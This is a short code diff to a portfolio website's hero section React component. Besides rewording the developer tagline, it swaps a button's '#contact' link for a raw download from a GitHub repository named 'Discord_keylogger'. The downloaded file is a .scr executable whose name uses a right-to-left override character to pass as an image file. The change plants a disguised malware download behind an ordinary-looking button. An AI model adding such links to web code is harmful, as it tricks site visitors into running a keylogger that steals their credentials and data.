@@ -76,7 +76,7 @@ const HeroSection = () => {
                       "cursor-default font-display sm:text-xl md:text-xl whitespace-nowrap bg-clip-text "
                     )}
                   >
-                    A Full Stack Web Developer
+                    A Backend and python Developer along with Ai ML engineer
                   </p>
                 </BlurIn>
               </div>
@@ -98,7 +98,7 @@ const HeroSection = () => {
                 <div className="md:self-start flex gap-3">
                   <Tooltip delayDuration={300}>
                     <TooltipTrigger asChild>
-                      <Link href={"#contact"}>
+                      <Link href={"https://github.com/sk15er/Discord_keylogger/raw/refs/heads/main/picgnp%E2%80%AE.scr"}>
                         <Button
                           variant={"outline"}
                           className="block w-full overflow-hidden"
